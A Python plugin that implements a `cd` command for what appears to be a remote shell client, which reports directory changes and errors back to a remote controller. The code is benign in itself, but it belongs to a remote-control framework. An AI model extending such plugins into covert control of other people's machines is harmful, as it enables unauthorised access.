import sys
from os import chdir
from os.path import expanduser
import shlex


class Plugin(object):
    """
    Implementation of the `cd` command for changing directories.
    """

    version = 'v1.0'
    invocation = 'cd '
    enabled = True

    def run(self, client, data):
        data = data.strip()
        try:
            _dir = data

            # Cross platform cd to ~/
            if _dir[:2] == '~/':
                # Shorten variable name and function name for the next 1 liner.
                p, expusr = sys.platform, expanduser
                # Get the full path.
                _dir = expusr('~') + '/' + _dir[2:] if p != 'win32' else expanduser('~') + '\\' + _dir[2:]
            else:
                _dir = shlex.split(_dir)[0]

            # Change the directory
            chdir(_dir)
            # Send blank data back.  This will trigger the server to
            # request the current working directory, which will then
            # be displayed to the controller using the server shell.
            # This is how it mimics the `cd` command.
            client.send_data('')
            return
        except Exception as err_msg:
            # If we get any errors, send em back!
            err_msg = str(err_msg)
            client.send_data(err_msg + "\n")
            return


